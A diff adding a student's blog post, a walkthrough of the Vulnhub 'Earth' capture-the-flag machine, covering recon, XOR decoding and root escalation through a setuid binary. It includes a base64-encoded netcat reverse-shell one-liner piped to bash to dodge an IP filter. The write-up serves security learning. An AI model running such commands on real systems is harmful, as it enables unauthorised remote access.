@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Vulnhub Earth Walkthrough | Cyber Turtle</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Vulnhub Earth Walkthrough" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef." />
+<meta property="og:description" content="This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef." />
+<link rel="canonical" href="http://localhost:4000/post/hacking/2023/04/10/vulnub_earth.html" />
+<meta property="og:url" content="http://localhost:4000/post/hacking/2023/04/10/vulnub_earth.html" />
+<meta property="og:site_name" content="Cyber Turtle" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-04-10T06:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Vulnhub Earth Walkthrough" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-10T06:00:00-04:00","datePublished":"2023-04-10T06:00:00-04:00","description":"This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef.","headline":"Vulnhub Earth Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/post/hacking/2023/04/10/vulnub_earth.html"},"url":"http://localhost:4000/post/hacking/2023/04/10/vulnub_earth.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Cyber Turtle" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Cyber Turtle</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/">Home</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Vulnhub Earth Walkthrough</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-04-10T06:00:00-04:00" itemprop="datePublished">Apr 10, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef.</p>
+
+<p>The first thing I did on my Kali Linux machine was to see if the vulnerable machine was up and running, and to find out the machine’s IP address.</p>
+
+<p>My Kali Linux machine is 192.168.56.22, so Earth’s address must be 192.168.56.23. And according to the nmap scan, the ports open up are ports 22 (SSH), 80 (HTTP), and 443 (HTTPS). Those two ports open up means there must be a web application. Before doing anything else, I opened up my browser in order to see what the web application looks like, and see if I can find anything I can use.</p>
+
+<p>If you use http to view the web app, you will see a 400 error. However, if you use https, you will see a default web page. If you take a look at the certificate, you will see the DNS name for the web server.</p>
+
+<p>HTTP</p>
+
+<p>HTTPS
+In order to continue with reconnaissance, I used a few tools. The first was a specific nmap scan of the machine.</p>
+
+<p>Breaking down the nmap command, -p 22,80,443 just means I’m scanning those ports. I figured since this was an ‘easy’ machine, I really wouldn’t need to scan for more. -O is for the operating system, which you need sudo (root or administrator on Linux) privileges for, and the -sV flag is getting the service versions for those services running. I’m basically just looking for potential vulnerabilities. If outdated versions of services are running, for example, then I can use that to get into the system.</p>
+
+<p>As a side note, when you’re doing this, you should direct the output to a file. I forgot to do that, and when I wanted to get the information again, I had to run a second nmap scan. It’s not a big deal in this scenario, but in an actual penetration test, that is probably a big mistake.</p>
+
+<p>To do a little bit more web enumeration, I used the dirb command, a command line web enumeration tool, in order to find out what directories on the service are running. If you don’t specify the wordlist, it will default to common.txt. That was what I wanted, so I didn’t use any other wordlist for this particular stage. And again, I would definitely append this to a file so you can reference it later.</p>
+
+<p>The results of the dirb scan said there was one directory, the cgi-bin directory, and that returns a 403 error.</p>
+
+<p>Up until this point I was using the ip address for nmap and dirb. And while doing that, I couldn’t figure anything out. The versions of http and https didn’t have vulnerabilities that I was going to be able to exploit. It looked like I had hit a dead end. I looked at the certificate again, and I edited my /etc/hosts file to map the hostname to the ip address. After I did that, this web enumeration became a lot easier. You can just use any text editor of choice to map the ip address to ‘earth.local’ and ‘terratest.earth.local’.</p>
+
+<p>From the screenshot, there is a user input field that allows me to send a message to Earth. There are previous messages that also look encrypted.</p>
+
+<p>Doing another dirb scan of both earth.local and terratest.earth.local, there is a new directory, called admin. When I visit there, there is a login field. This is a good discovery, but I don’t really have any useful information. I don’t have usernames and I don’t have passwords.</p>
+
+<p>Also, up until this point, I was using http for the dirb scan. Switching up to https, however, gave me much more detail.</p>
+
+<p>It specifically gave me a robots.txt file. That file essentially just tells web crawlers what pages they can and can’t visit. Visiting the robots.txt page, one disallowed directory caught my eye. Visiting that page got me a username, and it also got me the encryption method (XOR).</p>
+
+<p>And then going to the other page mentioned, testdata.txt, got me this message.</p>
+
+<p>That message, mentioned in the previous page, is the key used. When it comes to encryption, if the key is compromised, then a new key needs to be used asap. You definitely do not want any attackers finding your encryption key. Anything encrypted can be decrypted using the key.</p>
+
+<p>Trying to decode the first two messages on the web page is useless, they’re just nonsensical messages. The third one is the most important one. To decode it, I went to CyberChef.</p>
+
+<p>This part took a lot of googling on my part, but I found that converting the message From Hex, and then using XOR with the testdata.txt as the key managed to decrypt the message.</p>
+
+<p>That looks like it could be something good, like a password. I have a username ‘terra’. Going back to the login page, I tried that as the password, and I was in the system.</p>
+
+<p>And I could run commands. The first thing I wanted to do was set up a netcat listener. I ran ‘which nc’ to make sure the ‘nc’ command was on the machine. It was on the machine, so I could theoretically run it.</p>
+
+<p>However, when I tried to run it, I ran into that message. I would have to figure out another way of getting into the system. That however, took a while, so before that I decided to run “locate ‘flag’” to see if I could find the first flag just on this CLI interface.</p>
+
+<p>With the first flag found, I needed to figure out how I could spawn that shell on the system. The easiest solution would be to see if I could view the /etc/passwd and /etc/shadow file. If I could, then I could just brute force passwords. However, while the /etc/passwd was viewable, /etc/shadow was not.</p>
+
+<p>Experimenting with it a bit further, and with a bit more googling and playing around with it, I found that the remote connections are being detected by IP address in the command.</p>
+
+<p>In the screenshot, even though the command ‘echo’ is not going to set up a remote connection, it is still blocked because of the IP address. As a side note, if you type in an invalid IP address (if any of the numbers are over 255), then it’ll go through. So it’s not only testing the format, it’s also testing if it is a valid IP address.</p>
+
+<p>So using that knowledge to set up a listener, I did the following steps. There are probably easier ways to do this, but this is how I did it.</p>
+
+<p>Encode the command that I’m going to run on the web CLI. This command is going to set up the listener. Encoding it will ensure that the command will slip through whatever is detecting the IP address. You can probably use any command line encryption method, but I used base64.</p>
+
+<p>Set up a netcat listener on your port of choice.</p>
+
+<p>On the victim web application, echo the encoded command, pipe the output to be decoded, and then run ‘bash -’ to ensure that the stdin is run as a command. It should look something like this:
+echo “bmMgMTkyLjE2OC41Ni4yMiA0NDQ0IC1lIC9iaW4vYmFzaAo=” | base64 -d | bash -</p>
+
+<p>After doing all that, I have a listener on the machine! And to make sure I had some more interface control, I spawned an interactive shell.</p>
+
+<p>And now, I had to figure out how to pivot from here. I am currently an apache user, and I need to figure out how to get to root. The first thing I did was run ‘sudo -l’ to figure out what I can run as a sudo user. However, even that required a password, so I figured that wasn’t going to be fruitful.</p>
+
+<p>Running the above command finds all binaries where they run as the owner of the file, not as the user who called it. There is a binary called ‘reset_root’. If you try to run that, it fails and says that “all triggers not present”. I figured I needed to find out what those triggers are. Using the strings command, I wanted to see exactly what this binary does. I found that if the binary runs successfully, root’s password will be changed to ‘Earth’. To figure out what exactly the triggers needed to be, I transferred the binary over to my Kali Linux machine. To do that, I just set up a ncat listener on my Kali machine to send any output to a file, and then sent it over on the shell I had on the victim machine.</p>
+
+<p>Then after that, I changed the permissions on the reset_root binary so that it is executable, and then used the ltrace command on it. Ltrace is essentially a command that runs another binary and sees what libraries are called. This is a great way to see what the ‘triggers’ the binary needs.</p>
+
+<p>And I saw what the triggers were for the binary to run successfully. I switched back over to the reverse shell, and I created those files. Then after running the binary, root password was switched to Earth.</p>
+
+<p>And then after that getting the root flag was straightforward. I switched over to root, went to the root directory, and the flag was there.</p>
+
+<p>This was a fun machine, and it is apparently the third in a series (Earth being the third planet from the sun). I think the main thing I learned from this was to basically not overlook anything. There were a few times during this where I was lost because of something I overlooked.</p>
+
+
+  </div><a class="u-url" href="/post/hacking/2023/04/10/vulnub_earth.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Cyber Turtle</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Cyber Turtle</li><li><a class="u-email" href="mailto:lukegearty@gmail.com">lukegearty@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/LukeGearty"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">LukeGearty</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>A cybersecurity student writing about cybersecurity things</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
